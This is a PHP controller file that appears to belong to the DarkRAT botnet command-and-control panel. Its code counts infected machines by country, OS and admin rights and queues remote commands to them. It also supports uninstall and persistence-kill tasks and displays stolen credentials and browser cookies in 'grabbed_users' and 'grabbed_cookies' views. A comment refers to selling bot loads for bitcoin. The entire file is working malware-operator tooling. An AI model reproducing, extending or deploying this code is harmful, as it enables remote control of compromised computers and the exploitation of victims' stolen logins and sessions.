<?php

class Main{

    public function __construct()
    {
        $this->config_done = false;

        $statement = $GLOBALS["pdo"]->prepare("SELECT * from config WHERE id = 1");
        $statement->execute(array()); // 1 Day
        $result = $statement->fetch();

        if($result["enryptionkey"] != "KQC" && $result["useragent"] != "somesecret" ){
            $this->config_done = true;
        }

        $GLOBALS["tpl"]->assign("config_done",$this->config_done);

    }

    private function getClientCount($sec,$key,$from = "install_date"){
        $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as count FROM bots WHERE UNIX_TIMESTAMP(".$from.") + ? ".$key." UNIX_TIMESTAMP()");
        $statement->execute(array($sec)); // 1 Day
        $result = $statement->fetch();
        return $result["count"];
    }


    public function js_str($s)
    {
        return '"' . addcslashes($s, "\0..\37\"\\") . '"';
    }

    private function js_array($array)
    {
        $temp = array_map(array($this,'js_str'), $array);
        return '[' . implode(',', $temp) . ']';
    }
    private function countryMap($country){
        if($country == "RS"){
            $country = "RU";
        }elseif(empty($country)){
            $country = "na";
        }
        return $country;
    }

    //dashboard function
    public function index(){

            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
            $result = $statement->execute(array(1));
            $config = $statement->fetch();

            //select count(*),now() as now  from bots where UNIX_TIMESTAMP(lastresponse) > UNIX_TIMESTAMP((now() + interval -3 minute))
            $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots ORDER BY lastresponse DESC";
            $allbots = array();
            $botcount = 0;
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $allbots[] = $row;
                $botcount++;
            }
             $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
             $return = array();
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                 $return[ strtolower( $this->countryMap($row["country"]))] = intval ($row["NUM"]);
             }
            //GET ONLINE CLIENTS
            $onlinebotcount = $this->getClientCount(intval($config["requestinterval"]),">","lastresponse"); // 5 min.
            //GET DEAD CLIENTS
            $deadbotcount = $this->getClientCount( 604800 * 7,"<","lastresponse"); // 14 Days
            //New Clients in Last x Days
            $lastclientscount = $this->getClientCount(86400,">","lastresponse" ); // 1 Day
            $last12hclientscount = $this->getClientCount(43200,">","lastresponse" ); // 12 Hours
            $last7clientscount = $this->getClientCount(604800,">","lastresponse" ); // 7 Days
            // last 10 installs
            $statement = $GLOBALS["pdo"]->prepare("SELECT *,UNIX_TIMESTAMP(now()) as now, UNIX_TIMESTAMP(install_date) as install_date FROM `bots` ORDER BY `install_date` DESC LIMIT 10");
            $statement->execute(array());
            $last5Installs = $statement->fetchAll(PDO::FETCH_ASSOC);
            //======================== Country  HANDLER ========================
            $statement = $GLOBALS["pdo"]->prepare("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 6");
            $statement->execute(array());
            $top3Countrys = $statement->fetchAll(PDO::FETCH_ASSOC);
            $CountyLables = array();
            $CountyValues = array();
            foreach($top3Countrys as $country){
                $CountyLables[] = $country["country"];
                $CountyValues[] = $country["cnt"];
            }
            //======================== Country  HANDLER END ========================

            //======================== OPERING SYSTEM HANDLER ========================
            $statement = $GLOBALS["pdo"]->prepare("SELECT operingsystem, COUNT(*) AS cnt FROM bots GROUP BY operingsystem ORDER BY cnt DESC LIMIT 6");
            $statement->execute(array());
            $top3os = $statement->fetchAll(PDO::FETCH_ASSOC);
            $OsLables = array();
            $osValues = array();
            foreach($top3os as $os){
                    $OsLables[] = $os["operingsystem"];
                    $osValues[] = $os["cnt"];
            }
            //======================== OPERING SYSTEM HANDLER END========================
            //======================== ADMIN OR NOT HANDLER ========================
            $statement = $GLOBALS["pdo"]->prepare("SELECT isadmin, COUNT(*) AS cnt FROM bots GROUP BY isadmin ORDER BY cnt DESC");
            $statement->execute(array());
            $adminOrNotStats = $statement->fetchAll(PDO::FETCH_ASSOC);
            $AdminOrNotLables = array();
            $AdminOrNotValues = array();
            foreach($adminOrNotStats as $status){
                if($status["isadmin"] == "false"){
                    $status["label"] = "User";
                    //$status["isadmin"] = "Non Admin: ".$status["cnt"];
                }else{
                    //$status["isadmin"] = "Admins: ".$status["cnt"];
                    $status["label"] = "Admin";
                }
                $AdminOrNotLables[] = $status["label"];
                $AdminOrNotValues[] = $status["cnt"];
            }
            //======================== ADMIN OR NOT HANDLER END========================
            //======================== Architecture Stats ========================
            $statement = $GLOBALS["pdo"]->prepare("SELECT architecture, COUNT(*) AS cnt FROM bots GROUP BY architecture ORDER BY cnt DESC");
            $statement->execute(array());
            $architectureStatus = $statement->fetchAll(PDO::FETCH_ASSOC);
            $ArchitectureLables = array();
            $ArchitecturetValues = array();
            foreach($architectureStatus as $status){
                $ArchitectureLables[] = $status["architecture"];
                $ArchitecturetValues[] = $status["cnt"];
            }
            //======================== Architecture Stats END ========================

        /*
  * <!--
Botshop Transactions(all)
Loads sold (all)
Botshop Proift btc $

-->
  */

            $GLOBALS["tpl"]->assign("allbots", $allbots);
            $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
            $GLOBALS["tpl"]->assign("botcount", $botcount);
            $GLOBALS["tpl"]->assign("onlinebotcount", $onlinebotcount);
            $GLOBALS["tpl"]->assign("deadbotcount", $deadbotcount);
            $GLOBALS["tpl"]->assign("lastclientscount", $lastclientscount);
            $GLOBALS["tpl"]->assign("last12hclientscount", $last12hclientscount);
            $GLOBALS["tpl"]->assign("last7clientscount", $last7clientscount);
            $GLOBALS["tpl"]->assign("last5Installs", $last5Installs);
            $GLOBALS["tpl"]->assign("top3Countrys", $top3Countrys);
            $GLOBALS["tpl"]->assign("top3osLables", $this->js_array($OsLables));
            $GLOBALS["tpl"]->assign("top3osvalues", $this->js_array($osValues));
            $GLOBALS["tpl"]->assign("adminOrNotLables",$this->js_array($AdminOrNotLables));
            $GLOBALS["tpl"]->assign("adminOrNotValues",$this->js_array($AdminOrNotValues));
            $GLOBALS["tpl"]->assign("architectureLables",$this->js_array($ArchitectureLables));
            $GLOBALS["tpl"]->assign("architectureValue",$this->js_array($ArchitecturetValues));
            $GLOBALS["tpl"]->assign("countyLables",$this->js_array($CountyLables));
            $GLOBALS["tpl"]->assign("countyValue",$this->js_array($CountyValues));
            $GLOBALS["tpl"]->assign("architectureStatus",$architectureStatus);
    }

   private function random_string() {
        if(function_exists('random_bytes')) {
            $bytes = random_bytes(16);
            $str = bin2hex($bytes);
        } else if(function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes(16);
            $str = bin2hex($bytes);
        } else if(function_exists('mcrypt_create_iv')) {
            $bytes = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
            $str = bin2hex($bytes);
        } else {
            //Bitte euer_geheim_string durch einen zufälligen String mit >12 Zeichen austauschen
            $str = md5(uniqid('euer_geheimer_string', true));
        }
        return $str;
    }

    private function shorter($text, $chars_limit)
    {
        // Check if length is larger than the character limit
        if (strlen($text) > $chars_limit)
        {
            // If so, cut the string at the character limit
            $new_text = substr($text, 0, $chars_limit);
            // Trim off white space
            $new_text = trim($new_text);
            // Add at end of text ...
            return $new_text . "...";
        }
        // If not just return the text as is
        else
        {
            return $text;
        }
    }

    public function tasks($botid = ""){
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="tasks";
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            if(!empty($_POST["delete"])){
                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM tasks WHERE id = ?");
                $statement->execute(array($_POST["taskid"]));
            }
            if(!empty($_POST["task"])) {
                $filter = array();
                $filter["onlybot"] = $botid;
                if(!empty($_POST["country-filter"])){
                    $filter["country"] = implode(', ', $_POST['country-filter']);
                }
                if(!empty($_POST["version"])){
                    $filter["version"] = $_POST['version'];
                }
                if(!empty($_POST["netFramwork-filter"])){
                    $filter["netFramwork"] = implode(', ', $_POST['netFramwork-filter']);
                }
                $exectionLimit = 0;
                if(!empty($_POST["limit"])){
                    $exectionLimit = $_POST["limit"];
                }
                if($_POST["task"] == "uninstall" || $_POST["task"] == "killpersistence") {
                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
                    $statement->execute(array(json_encode($filter), 1, 'killpersistence', $_POST["task"], $exectionLimit));
                }else{
                    if(empty($_POST["command"])){
                        die("Please Input a Command");
                    }
                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
                    $statement->execute(array(json_encode($filter), 1, $_POST["command"], $_POST["task"], $exectionLimit));
                }
                header("refresh: 0");
            }
            if(!empty($_POST["taskid"]) && !empty($_POST["taskstatus"])) {
                if($_POST["taskstatus"] == "run"){
                    $taskstatus = 1;
                }else{
                    $taskstatus = 0;
                }
                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
                $statement->execute(array($taskstatus, $_POST["taskid"]));
                header("Refresh: 0");
            }
            $sql = "SELECT COUNT(tasks_completed.id) as executions, tasks.* FROM tasks LEFT JOIN tasks_completed ON tasks.id = tasks_completed.taskid GROUP BY tasks.id";
            $allTasks = array();
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
               $row["command_short"] = $this->shorter($row["command"],20);
               $allTasks[] = $row;
            }
            $countries = array();
            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots group by country  ORDER BY country") as $row) {
                $countries[] = $row["country"];
            }

            if($botid != ""){
                $GLOBALS["tpl"]->assign("showCountryFilter", "false");
            }else{
                $GLOBALS["tpl"]->assign("showCountryFilter", "true");
            }

            $GLOBALS["tpl"]->assign("allTasks", $allTasks);
            $GLOBALS["tpl"]->assign("countries", $countries);
        }

        public function login(){
            if(!empty($_SESSION["darkrat_userid"])){
                Header("Location: /dashboard");
            }
            if(!empty($_POST)){
                $username = $_POST['userid'];
                $passwort = $_POST['pswrd'];
                
                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username AND active = 1");
                $result = $statement->execute(array('username' => $username));
                $user = $statement->fetch();
                    
                //Überprüfung des Passworts
                if ($user !== false && password_verify($passwort, $user['passwort'])) {
                    $_SESSION['darkrat_userid'] = $user['id'];

                    if(isset($_POST['save_login'])) {
                        $identifier = $this->random_string();
                        $securitytoken = $this->random_string();

                        $insert = $GLOBALS["pdo"]->prepare("INSERT INTO securitytokens (user_id, identifier, securitytoken) VALUES (:user_id, :identifier, :securitytoken)");
                        $insert->execute(array('user_id' => $user['id'], 'identifier' => $identifier, 'securitytoken' => sha1($securitytoken)));
                        setcookie("identifier",$identifier,time()+(3600*24*365)); //1 Year
                        setcookie("securitytoken",$securitytoken,time()+(3600*24*365)); //1 Year
                    }

                    header("Location: /dashboard");
                } else {
                    $errorMessage = "Incorect Details<br>";
                }  
            }
        }

        public function taskdetails($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }

            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="taskdetails";
            $sql = "SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
            LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
            LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
            WHERE tasks_completed.taskid = ? group by tasks_completed.bothwid";
            $tasks = array();
            $statement =  $GLOBALS["pdo"]->prepare($sql);
            $statement->execute(array($id));
            while($row = $statement->fetch(PDO::FETCH_ASSOC)) {
                $tasks[] = $row;
            }
            $worldmap = array();
            $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $worldmap[ strtolower( $this->countryMap($row["country"]))] = intval ($row["NUM"]);
            }
            $GLOBALS["tpl"]->assign("tasks", $tasks);
            $GLOBALS["tpl"]->assign("worldmap", json_encode($worldmap));
        }

        public function logout(){
            session_destroy();
            //Remove Cookies
            setcookie("identifier","",time()-(3600*24*365));
            setcookie("securitytoken","",time()-(3600*24*365));

            Header("Location: /");
        }

        public function edituser($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="edituser";

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE id = ?");
            $result = $statement->execute(array($id));
            $user = $statement->fetch();
            $GLOBALS["tpl"]->assign("user", $user);
            if(!empty($_POST)){
                $passwort_hash = password_hash($_POST["password"], PASSWORD_DEFAULT);
                $statement = $GLOBALS["pdo"]->prepare("UPDATE users SET passwort = ? WHERE id = ?");
                $result = $statement->execute(array($passwort_hash,$id));
                header("refresh: 2");
                die("Success Please wait...");
            }
        }

        public function settings()
        {
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users");
            $statement->execute(array());
            $users = $statement->fetchAll();

            $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
            $statementConfig->execute(array("1"));
            $config = $statementConfig->fetch();
            $encryptedOUT = "";



            //Fetching templates from Template dir and Assign to config array
            $currentTheme = "v1";
            $dir    = __DIR__.'/../../../templates';
            $allFiles = scandir($dir);
            $templates = array_diff($allFiles, array('.', '..'));
            if(!empty($config["template"])){
                $currentTheme = $config["template"];
            }
            $config["currentTheme"] = $currentTheme;

          //  var_dump($templates);
          //  die();



            if(!empty($_POST)){
                if(!empty($_POST["pluginChanger"])){
                    $activePlugins = explode(",",$config["plugins"]);
                    if(!in_array($_POST["pluginChanger"],$activePlugins)){
                        $activePlugins[$_POST["pluginChanger"]] = $_POST["pluginChanger"];
                        $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET plugins = ? WHERE id = ?");
                        $statement->execute(array(implode(",",$activePlugins),1));
                    }else{
                        $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET plugins = ? WHERE id = ?");
                        $statement->execute(array(str_replace(",".$_POST["pluginChanger"],"",$config["plugins"]),1));
                    }

                    if(file_exists(__DIR__."/../../../modules/".$_POST["pluginChanger"]."/".$_POST["pluginChanger"].".sql")){
                       $sql = file_get_contents(__DIR__."/../../../modules/".$_POST["pluginChanger"]."/".$_POST["pluginChanger"].".sql");
                       $GLOBALS["pdo"]->query($sql);
                    }
                }
                if(!empty($_POST["clearcache"])){
                    $tempdir = __DIR__."/../../../../../templates_c";
                    // Remove a dir (all files and folders in it)
                    $i = new DirectoryIterator($tempdir);
                    foreach($i as $f) {
                        if($f->isFile()) {
                            unlink($f->getRealPath());
                        } else if(!$f->isDot() && $f->isDir()) {
                            rrmdir($f->getRealPath());
                            rmdir($f->getRealPath());
                        }
                    }
                }
                if(!empty($_POST["changeTemplate"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET template = ? WHERE id = ?");
                    $statement->execute(array($_POST["changeTemplate"],1));
                }
                if(!empty($_POST["forcecompile_template"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET forcecompile_template = ? WHERE id = ?");
                    $statement->execute(array($_POST["forcecompile_template"],1));
                }
                if(!empty($_POST["enryptionkey"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET enryptionkey = ? WHERE id = ?");
                    $statement->execute(array($_POST["enryptionkey"],1));
                }
                if(!empty($_POST["updateinfo"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET check_update_url = ? WHERE id = ?");
                    $statement->execute(array($_POST["updateinfo"],1));
                }
                if(!empty($_POST["useragent"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET useragent = ? WHERE id = ?");
                    $statement->execute(array($_POST["useragent"],1));
                }
                if(!empty($_POST["requestinterval"])){
                    if(is_int(intval($_POST["requestinterval"]))){
                        $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET requestinterval = ? WHERE id = ?");
                        $statement->execute(array($_POST["requestinterval"],1));
                    }
                }
                if(!empty($_POST["blockuser"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE users SET active = ? WHERE id = ?");
                    $active = 1;
                    if($_POST["blockuser"] == "lock"){
                        $active = 0;
                    }
                    $statement->execute(array($active,$_POST["userid"]));
                }

                if(!empty($_POST["createuser_username"]) && !empty($_POST["createuser_password"])){
                    //Check if user Exists
                    $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username");
                    $result = $statement->execute(array('username' => $_POST["createuser_username"]));
                    $user = $statement->fetch();
                    if($user !== false) {
                        die("Sorry The User Exists");
                    }else{
                        $passwort_hash = password_hash($_POST["createuser_password"], PASSWORD_DEFAULT);
                        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO users (username, passwort) VALUES (:username, :passwort)");
                        $statement->execute(array('username' => $_POST["createuser_username"], 'passwort' => $passwort_hash));
                    }
                }



                if(!empty($_POST["encrypt"])){
                    $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
                    $statementConfig->execute(array("1"));
                    $config = $statementConfig->fetch();
                    $key = $config["enryptionkey"];
                    $cipher = new  phpseclib\Crypt\RC4();
                    $cipher->setKey($key);
                    $encrypted = $cipher->encrypt($_POST["encrypt"]);
                    $encryptedOUT =  base64_encode($encrypted);
                    //$encryptedOUT =$handler->xor_this($_POST["encrypt"]);
                }else{
                    Header("Location: /settings");
                }
           }



            $GLOBALS["tpl"]->assign("users", $users);
            $GLOBALS["tpl"]->assign("config", $config);
            $GLOBALS["tpl"]->assign("templates", $templates);
            $GLOBALS["tpl"]->assign("encryptedOUT", $encryptedOUT);

            $GLOBALS["tpl"]->assign("foundPlugins", $GLOBALS["foundPlugins"]);
        }

        function formatBytes($size, $precision = 2) {
            $base = log($size * 1024, 1024);
            $suffixes =array('B', 'KB', 'MB', 'GB', 'TB');
            return round(pow(1024, $base - floor($base)), $precision) .' '. $suffixes[floor($base)];
        }

        public  function botinfo($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }


            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="botinfo";
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE id = ?");
            $result = $statement->execute(array($id));
            $row = $statement->fetch(PDO::FETCH_ASSOC);

            if(!empty($_POST["delete_bot"])){
                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM bots WHERE id = ?");
                $statement->execute(array($_POST["botid"]));

                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM tasks_completed WHERE bothwid LIKE ?");
                $statement->execute(array($row["hwid"]));
                Header("Location: /bots");
            }


            $row["ram"] = $this->formatBytes($row["ram"]);
            $GLOBALS["tpl"]->assign("botinfo",$row);
        }

        public function passrecovery(){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_users");
            $result = $statement->execute(array());
            $rows = $statement->fetchAll(PDO::FETCH_ASSOC);

            $GLOBALS["tpl"]->assign("allusers",$rows);
        }

        public function bots(){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots ORDER BY lastresponse DESC";
            $allbots = array();
            $botcount = 0;
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $allbots[] = $row;
                $botcount++;
            }
            $GLOBALS["tpl"]->assign("allbots", $allbots);
        }

        public function cookiemanager($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="cookiemanager";
            $statement = $GLOBALS["pdo"]->prepare("SELECT *, grabbed_users.id as userid FROM grabbed_cookies 
            LEFT JOIN grabbed_users ON instr( grabbed_users.site, grabbed_cookies.site) > 0
            WHERE grabbed_users.id = ?");
            $result = $statement->execute(array($id));
            $userinfo = $statement->fetchAll(PDO::FETCH_ASSOC);

            $GLOBALS["tpl"]->assign("userinfo", $userinfo);
        }

}